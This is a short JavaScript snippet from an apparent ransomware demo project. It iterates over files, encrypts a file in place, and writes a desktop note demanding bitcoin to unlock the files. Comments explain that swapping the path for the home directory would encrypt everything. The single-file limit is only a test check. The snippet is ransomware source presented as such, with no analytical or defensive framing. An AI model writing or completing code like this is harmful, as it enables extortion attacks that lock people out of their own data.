;(async () => {
    // Change ../ to homedir to loop through all the changes
    for await (const f of getFiles('../')) {
        // this is just a check so that I only encrypt one file.
        if(f === '/Users/nathan/Documents/Projects/ransomware/test/test.txt') {
            const data = fs.readFileSync(f, 'utf8')
            fs.writeFileSync(f, encrypt(data))
            fs.writeFileSync(`${homedir}/Desktop/unlock.txt`, 'To unlock your files you`ll need to send bitoin to this address')
        }
    }
  })()